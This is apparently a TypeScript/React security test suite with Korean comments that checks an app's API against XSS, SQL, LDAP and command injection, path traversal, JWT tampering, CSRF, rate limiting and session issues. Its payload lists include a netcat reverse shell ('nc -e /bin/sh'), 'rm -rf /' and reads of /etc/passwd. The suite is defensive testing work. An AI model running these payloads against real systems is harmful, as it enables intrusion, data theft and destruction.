/**
 * 보안 테스트 스위트
 * 인증, 권한 부여, 입력 검증, XSS, CSRF 등 보안 취약점 테스트
 */

import React, { useState } from 'react';
import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { render, screen, fireEvent, waitFor } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { AuthTestUtils } from '../setup/auth-setup.tsx';

// 보안 테스트 유틸리티
class SecurityTestUtils {
  // XSS 페이로드 생성
  static getXSSPayloads() {
    return [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      'javascript:alert("XSS")',
      '<svg onload=alert("XSS")>',
      '<iframe src="javascript:alert(\'XSS\')">',
      '<body onload=alert("XSS")>',
      '"><script>alert("XSS")</script>',
      '\'-alert("XSS")-\'',
      '<script>document.cookie="steal=yes";</script>',
      '<meta http-equiv="refresh" content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4K">',
    ];
  }

  // SQL 인젝션 페이로드 생성
  static getSQLInjectionPayloads() {
    return [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "' UNION SELECT * FROM users --",
      "'; DELETE FROM users WHERE '1'='1'; --",
      "' OR 1=1 --",
      "admin'--",
      "admin'/*",
      "' OR 'a'='a",
      "') OR ('1'='1",
      "1' AND (SELECT COUNT(*) FROM users) > 0 --",
    ];
  }

  // LDAP 인젝션 페이로드
  static getLDAPInjectionPayloads() {
    return [
      '*)(uid=*',
      '*)(|(uid=*))',
      '*)(&(uid=*)',
      '*)(&(|(uid=*))',
      '*)(objectClass=*',
      '*))(|(objectClass=*',
    ];
  }

  // 커맨드 인젝션 페이로드
  static getCommandInjectionPayloads() {
    return [
      '; cat /etc/passwd',
      '| whoami',
      '&& ls -la',
      '|| id',
      '; rm -rf /',
      '`cat /etc/passwd`',
      '$(whoami)',
      '; nc -e /bin/sh 192.168.1.100 1234',
    ];
  }

  // Path Traversal 페이로드
  static getPathTraversalPayloads() {
    return [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd',
      '..%252f..%252f..%252fetc%252fpasswd',
      '....\\....\\....\\windows\\system32\\drivers\\etc\\hosts',
    ];
  }

  // 큰 페이로드 생성 (DoS 테스트용)
  static getLargePayload(size = 10000) {
    return 'A'.repeat(size);
  }

  // 특수 문자 페이로드
  static getSpecialCharPayloads() {
    return [
      '!@#$%^&*()_+',
      '<>?:"{}|[]\\',
      '~`',
      'null\x00byte',
      '\r\n\r\n',
      '\x00\x01\x02\x03',
      'Ω≈ç√∫˜µ≤≥÷',
      '🚀🔥💡✨🎯',
    ];
  }

  // JWT 토큰 조작
  static manipulateJWTToken(originalToken: string, manipulation: 'signature' | 'payload' | 'header' = 'payload') {
    if (!originalToken || !originalToken.includes('.')) {
      return 'invalid.jwt.token';
    }

    const parts = originalToken.split('.');

    switch (manipulation) {
      case 'signature':
        // 시그니처 변조
        return `${parts[0]}.${parts[1]}.manipulated_signature`;

      case 'payload':
        // 페이로드 변조 (admin 권한 추가)
        const manipulatedPayload = btoa(JSON.stringify({
          sub: 'malicious_user',
          iss: 'fake_issuer',
          aud: 'target_app',
          exp: Math.floor(Date.now() / 1000) + 3600,
          iat: Math.floor(Date.now() / 1000),
          admin: true,
          role: 'admin',
        }));
        return `${parts[0]}.${manipulatedPayload}.${parts[2]}`;

      case 'header':
        // 헤더 변조 (알고리즘 변경)
        const manipulatedHeader = btoa(JSON.stringify({
          alg: 'none',
          typ: 'JWT',
        }));
        return `${manipulatedHeader}.${parts[1]}.`;

      default:
        return originalToken;
    }
  }

  // CSRF 토큰 우회 시도
  static bypassCSRFToken() {
    return {
      'X-Requested-With': 'XMLHttpRequest',
      'Origin': 'http://malicious-site.com',
      'Referer': 'http://malicious-site.com/attack.html',
    };
  }
}

describe('보안 테스트 스위트', () => {
  let authUtils: AuthTestUtils;

  beforeEach(() => {
    authUtils = new AuthTestUtils();
    vi.clearAllMocks();
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  describe('인증 보안 테스트', () => {
    it('잘못된 JWT 토큰을 거부해야 한다', async () => {
      const invalidTokens = [
        'invalid.token.format',
        'Bearer invalid_token',
        '',
        'null',
        'undefined',
        SecurityTestUtils.manipulateJWTToken('valid.jwt.token', 'signature'),
        SecurityTestUtils.manipulateJWTToken('valid.jwt.token', 'payload'),
        SecurityTestUtils.manipulateJWTToken('valid.jwt.token', 'header'),
      ];

      for (const invalidToken of invalidTokens) {
        const response = await fetch('/api/protected-endpoint', {
          headers: {
            'Authorization': `Bearer ${invalidToken}`,
          },
        });

        expect(response.status).toBe(401);
      }
    });

    it('만료된 토큰을 거부해야 한다', async () => {
      const expiredToken = authUtils.createExpiredToken();

      const response = await fetch('/api/protected-endpoint', {
        headers: {
          'Authorization': `Bearer ${expiredToken}`,
        },
      });

      expect(response.status).toBe(401);
    });

    it('권한이 없는 사용자의 접근을 차단해야 한다', async () => {
      const userToken = authUtils.createUserToken();
      const adminToken = authUtils.createAdminToken();

      // 일반 사용자가 관리자 엔드포인트 접근 시도
      const response = await fetch('/api/admin/users', {
        headers: {
          'Authorization': `Bearer ${userToken}`,
        },
      });

      expect(response.status).toBe(403);

      // 관리자는 접근 가능
      const adminResponse = await fetch('/api/admin/users', {
        headers: {
          'Authorization': `Bearer ${adminToken}`,
        },
      });

      expect(adminResponse.status).toBe(200);
    });

    it('세션 고정 공격을 방지해야 한다', async () => {
      // 로그인 전 세션 ID
      const preLoginSessionId = 'malicious_session_id';

      const loginResponse = await fetch('/api/auth/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Cookie': `session_id=${preLoginSessionId}`,
        },
        body: JSON.stringify({
          email: 'test@example.com',
          password: 'password123',
        }),
      });

      // 로그인 후 새로운 세션 ID가 발급되어야 함
      const setCookieHeader = loginResponse.headers.get('Set-Cookie');
      expect(setCookieHeader).not.toContain(preLoginSessionId);
    });

    it('무차별 대입 공격을 방지해야 한다', async () => {
      const attempts = [];

      // 연속적인 로그인 실패 시도
      for (let i = 0; i < 10; i++) {
        const response = await fetch('/api/auth/login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            email: 'test@example.com',
            password: `wrong_password_${i}`,
          }),
        });

        attempts.push(response.status);
      }

      // 일정 횟수 이후 429 (Too Many Requests) 응답
      const rateLimitedAttempts = attempts.filter(status => status === 429);
      expect(rateLimitedAttempts.length).toBeGreaterThan(0);
    });
  });

  describe('입력 검증 보안 테스트', () => {
    it('XSS 공격을 방지해야 한다', async () => {
      const xssPayloads = SecurityTestUtils.getXSSPayloads();

      for (const payload of xssPayloads) {
        // 사용자 이름 필드에 XSS 페이로드 입력
        const response = await fetch('/api/users/profile', {
          method: 'PUT',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer valid_token',
          },
          body: JSON.stringify({
            name: payload,
            bio: payload,
          }),
        });

        // 입력이 거부되거나 이스케이프되어야 함
        if (response.ok) {
          const data = await response.json();
          expect(data.name).not.toContain('<script>');
          expect(data.name).not.toContain('javascript:');
          expect(data.bio).not.toContain('<script>');
        } else {
          expect(response.status).toBe(400); // Bad Request
        }
      }
    });

    it('SQL 인젝션 공격을 방지해야 한다', async () => {
      const sqlPayloads = SecurityTestUtils.getSQLInjectionPayloads();

      for (const payload of sqlPayloads) {
        const response = await fetch(`/api/users/search?q=${encodeURIComponent(payload)}`, {
          headers: {
            'Authorization': 'Bearer valid_token',
          },
        });

        // SQL 인젝션이 성공하면 데이터베이스 오류나 예상치 못한 결과가 나올 수 있음
        expect(response.status).not.toBe(500); // Internal Server Error

        if (response.ok) {
          const data = await response.json();
          // 모든 사용자 정보가 노출되면 안됨
          expect(Array.isArray(data)).toBe(true);
          if (data.length > 0) {
            expect(data.length).toBeLessThan(100); // 비정상적으로 많은 결과 방지
          }
        }
      }
    });

    it('파일 업로드 보안을 검증해야 한다', async () => {
      const maliciousFiles = [
        { name: 'malware.exe', type: 'application/x-executable' },
        { name: 'script.php', type: 'application/x-php' },
        { name: 'shell.jsp', type: 'application/x-jsp' },
        { name: '../../../etc/passwd', type: 'text/plain' },
        { name: 'image.jpg.php', type: 'image/jpeg' },
      ];

      for (const file of maliciousFiles) {
        const formData = new FormData();
        formData.append('file', new Blob(['malicious content']), file.name);

        const response = await fetch('/api/upload', {
          method: 'POST',
          headers: {
            'Authorization': 'Bearer valid_token',
          },
          body: formData,
        });

        // 악성 파일은 업로드가 거부되어야 함
        expect(response.status).toBe(400); // Bad Request or 415 Unsupported Media Type
      }
    });

    it('Path Traversal 공격을 방지해야 한다', async () => {
      const pathTraversalPayloads = SecurityTestUtils.getPathTraversalPayloads();

      for (const payload of pathTraversalPayloads) {
        const response = await fetch(`/api/files/${encodeURIComponent(payload)}`, {
          headers: {
            'Authorization': 'Bearer valid_token',
          },
        });

        // 시스템 파일 접근이 차단되어야 함
        expect(response.status).not.toBe(200);
        expect(response.status).toBe(400); // Bad Request or 404 Not Found
      }
    });

    it('큰 페이로드로 인한 DoS 공격을 방지해야 한다', async () => {
      const largePayload = SecurityTestUtils.getLargePayload(1000000); // 1MB

      const response = await fetch('/api/posts', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': 'Bearer valid_token',
        },
        body: JSON.stringify({
          content: largePayload,
        }),
      });

      // 큰 페이로드는 거부되어야 함
      expect(response.status).toBe(413); // Payload Too Large
    });
  });

  describe('CSRF 보안 테스트', () => {
    it('CSRF 토큰 없는 요청을 거부해야 한다', async () => {
      const response = await fetch('/api/users/delete', {
        method: 'DELETE',
        headers: {
          'Authorization': 'Bearer valid_token',
          ...SecurityTestUtils.bypassCSRFToken(),
        },
      });

      // CSRF 토큰이 없으면 거부되어야 함
      expect(response.status).toBe(403); // Forbidden
    });

    it('잘못된 CSRF 토큰을 거부해야 한다', async () => {
      const response = await fetch('/api/users/delete', {
        method: 'DELETE',
        headers: {
          'Authorization': 'Bearer valid_token',
          'X-CSRF-Token': 'invalid_csrf_token',
        },
      });

      expect(response.status).toBe(403); // Forbidden
    });
  });

  describe('API 보안 테스트', () => {
    it('API 속도 제한을 적용해야 한다', async () => {
      const requests = [];

      // 짧은 시간 내에 많은 요청
      for (let i = 0; i < 100; i++) {
        requests.push(
          fetch('/api/posts', {
            headers: {
              'Authorization': 'Bearer valid_token',
            },
          })
        );
      }

      const responses = await Promise.all(requests);
      const rateLimitedResponses = responses.filter(r => r.status === 429);

      // 일부 요청이 속도 제한에 걸려야 함
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });

    it('민감한 정보를 응답에서 제외해야 한다', async () => {
      const response = await fetch('/api/users/profile', {
        headers: {
          'Authorization': 'Bearer valid_token',
        },
      });

      expect(response.status).toBe(200);

      const userData = await response.json();

      // 민감한 정보가 포함되지 않아야 함
      expect(userData).not.toHaveProperty('password');
      expect(userData).not.toHaveProperty('hashedPassword');
      expect(userData).not.toHaveProperty('accessToken');
      expect(userData).not.toHaveProperty('refreshToken');
      expect(userData).not.toHaveProperty('privateKey');
    });

    it('HTTP 보안 헤더를 설정해야 한다', async () => {
      const response = await fetch('/api/health');

      // 보안 헤더 확인
      expect(response.headers.get('X-Content-Type-Options')).toBe('nosniff');
      expect(response.headers.get('X-Frame-Options')).toBe('DENY');
      expect(response.headers.get('X-XSS-Protection')).toBe('1; mode=block');
      expect(response.headers.get('Strict-Transport-Security')).toContain('max-age=');
      expect(response.headers.get('Content-Security-Policy')).toBeTruthy();
    });
  });

  describe('프론트엔드 보안 테스트', () => {
    it('사용자 입력을 적절히 이스케이프해야 한다', async () => {
      const TestComponent = () => {
        const [userInput, setUserInput] = useState('');
        return (
          <div>
            <input
              data-testid="user-input"
              value={userInput}
              onChange={(e) => setUserInput(e.target.value)}
            />
            <div data-testid="output" dangerouslySetInnerHTML={{ __html: userInput }} />
          </div>
        );
      };

      render(<TestComponent />);

      const xssPayload = '<script>alert("XSS")</script>';
      const input = screen.getByTestId('user-input');

      await userEvent.type(input, xssPayload);

      const output = screen.getByTestId('output');

      // XSS 스크립트가 실행되지 않아야 함
      expect(output.innerHTML).not.toContain('<script>alert("XSS")</script>');
    });

    it('민감한 데이터를 로컬 스토리지에 저장하지 않아야 한다', () => {
      // 로컬 스토리지 확인
      const sensitiveKeys = ['password', 'token', 'secret', 'key', 'credential'];

      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (key) {
          const isSensitive = sensitiveKeys.some(sensitiveKey =>
            key.toLowerCase().includes(sensitiveKey)
          );

          expect(isSensitive).toBe(false);
        }
      }
    });

    it('외부 스크립트 로딩을 제한해야 한다', () => {
      const scriptTags = document.querySelectorAll('script[src]');

      scriptTags.forEach(script => {
        const src = script.getAttribute('src') || '';

        // 허용된 도메인에서만 스크립트 로드
        const allowedDomains = [
          'localhost',
          'your-domain.com',
          'cdn.jsdelivr.net',
          'unpkg.com',
          // 추가 허용 도메인들
        ];

        const isAllowed = allowedDomains.some(domain =>
          src.includes(domain) || src.startsWith('/')
        );

        expect(isAllowed).toBe(true);
      });
    });
  });

  describe('데이터 보호 테스트', () => {
    it('개인정보를 암호화해야 한다', async () => {
      const response = await fetch('/api/admin/users/raw', {
        headers: {
          'Authorization': 'Bearer admin_token',
        },
      });

      expect(response.status).toBe(200);

      const userData = await response.json();

      // 이메일과 개인정보가 암호화되어 저장되어야 함
      if (userData.length > 0) {
        const user = userData[0];

        // 이메일이 평문으로 저장되지 않았는지 확인
        if (user.encryptedEmail) {
          expect(user.encryptedEmail).not.toContain('@');
          expect(user.encryptedEmail).not.toEqual(user.email);
        }
      }
    });

    it('로그에 민감한 정보가 기록되지 않아야 한다', async () => {
      // 로그 스파이 설정
      const consoleSpy = vi.spyOn(console, 'log');
      const consoleErrorSpy = vi.spyOn(console, 'error');

      await fetch('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: 'test@example.com',
          password: 'secret_password_123',
        }),
      });

      // 로그에 비밀번호가 기록되지 않았는지 확인
      const allLogs = [
        ...consoleSpy.mock.calls.flat(),
        ...consoleErrorSpy.mock.calls.flat(),
      ].join(' ');

      expect(allLogs).not.toContain('secret_password_123');
      expect(allLogs).not.toContain('password');

      consoleSpy.mockRestore();
      consoleErrorSpy.mockRestore();
    });
  });

  describe('세션 보안 테스트', () => {
    it('세션 타임아웃을 적용해야 한다', async () => {
      // 세션 생성
      const loginResponse = await fetch('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: 'test@example.com',
          password: 'password123',
        }),
      });

      const sessionCookie = loginResponse.headers.get('Set-Cookie');

      // 오래된 세션으로 요청
      const oldSessionResponse = await fetch('/api/users/profile', {
        headers: {
          'Cookie': sessionCookie || '',
          'X-Session-Age': '3600000', // 1시간 경과 시뮬레이션
        },
      });

      // 세션이 만료되어 인증 실패해야 함
      expect(oldSessionResponse.status).toBe(401);
    });

    it('동시 세션 수를 제한해야 한다', async () => {
      const sessions = [];

      // 동일 사용자로 여러 세션 생성 시도
      for (let i = 0; i < 10; i++) {
        const response = await fetch('/api/auth/login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            email: 'test@example.com',
            password: 'password123',
          }),
        });

        if (response.ok) {
          sessions.push(response.headers.get('Set-Cookie'));
        }
      }

      // 동시 세션 수가 제한되어야 함
      expect(sessions.length).toBeLessThanOrEqual(5); // 최대 5개 세션
    });
  });
});